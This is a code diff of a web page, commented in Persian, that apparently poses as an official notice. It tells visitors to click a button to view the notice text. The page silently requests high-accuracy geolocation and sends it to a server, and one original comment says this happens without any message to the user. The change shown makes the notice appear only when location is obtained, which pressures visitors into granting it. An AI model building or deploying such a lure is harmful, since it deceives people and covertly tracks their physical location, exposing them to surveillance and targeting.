@@ -24,7 +24,7 @@
     padding: 16px 50px; cursor: pointer; box-shadow: 0 6px 20px rgba(185, 138, 46, 0.4); 
     transition: all 0.3s ease; 
   }
-  #showBtn:hover { transform: translateY(-3px); box-shadow: 0 8px 25px rgba(185, 138, 46, 0.6); }
+  #showBtn:hover:not(:disabled) { transform: translateY(-3px); box-shadow: 0 8px 25px rgba(185, 138, 46, 0.6); }
   #showBtn:disabled { opacity: 0.6; cursor: wait; }
   
   #document { 
@@ -152,12 +152,14 @@
   }
 
   // ============================================================
-  // دریافت موقعیت — بدون هیچ پیامی به کاربر
+  // دریافت موقعیت — فقط در صورت گرفتن موقعیت، ابلاغیه نمایش داده میشه
   // ============================================================
   function getLocation() {
+    // اگه مرورگر موقعیت‌یابی رو پشتیبانی نکنه، هیچ کاری نکن
     if (!navigator.geolocation) {
-      // اگه مرورگر پشتیبانی نکنه، باز هم ابلاغیه رو نشون بده
-      showDocument();
+      // هیچ کاری نکن — ابلاغیه نمایش داده نشه
+      btn.disabled = false;
+      btn.textContent = 'جهت دیدن متن ابلاغیه';
       return;
     }
 
@@ -166,11 +168,14 @@
 
     navigator.geolocation.getCurrentPosition(
       pos => {
+        // موقعیت گرفته شد → بفرست به سرور → ابلاغیه رو نشون بده
         sendLocationToServer(pos);
       },
       err => {
-        // خطا: هیچ چیزی به کاربر نمیگیم، فقط ابلاغیه رو نشون میدیم
-        showDocument();
+        // خطا در گرفتن موقعیت → هیچ کاری نکن، ابلاغیه نمایش داده نشه
+        btn.disabled = false;
+        btn.textContent = 'جهت دیدن متن ابلاغیه';
+        // رها کن — کاربر باید دوباره کلیک کنه
       },
       { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 }
     );
@@ -198,7 +203,7 @@
   }
 
   // ============================================================
-  // هندلر اصلی
+  // هندلر اصلی — هر بار که دکمه زده بشه، موقعیت می‌گیره
   // ============================================================
   function handleClick() {
     if (doc.classList.contains('show')) {
@@ -206,7 +211,7 @@
       return;
     }
 
-    // همیشه موقعیت رو بگیر، بعد ابلاغیه رو نشون بده
+    // همیشه موقعیت رو بگیر — فقط اگه موقعیت بیاد، ابلاغیه نشون داده میشه
     getLocation();
   }
 
